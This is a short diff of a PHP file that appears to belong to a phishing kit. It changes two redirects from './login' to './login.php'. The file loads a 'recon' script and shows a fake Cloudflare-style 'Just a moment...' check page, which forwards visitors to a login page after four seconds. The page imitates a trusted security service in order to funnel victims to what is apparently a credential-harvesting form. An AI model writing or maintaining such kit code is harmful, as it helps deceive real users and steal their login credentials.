@@ -15,7 +15,7 @@ require 'KU5H/recon.php';
 
     if ($CFProtection == "off") {
         
-        die('<script> window.location.href = \'./login\'; </script>');
+        die('<script> window.location.href = \'./login.php\'; </script>');
     }
 
 else{
@@ -29,7 +29,7 @@ echo('<!DOCTYPE html>
         <title>Just a moment...</title>
         <link rel="shortcut icon" href="./V1P3R/img/favicon.png" type="image/x-icon">
         <link rel="stylesheet" href="./V1P3R/css/cf.css">
-        <script>setTimeout(function(){ window.location.href = \'./login\';}, 4000);</script>
+        <script>setTimeout(function(){ window.location.href = \'./login.php\';}, 4000);</script>
     </head>
     <body>
         <table width="100%" height="100%" cellpadding="20">
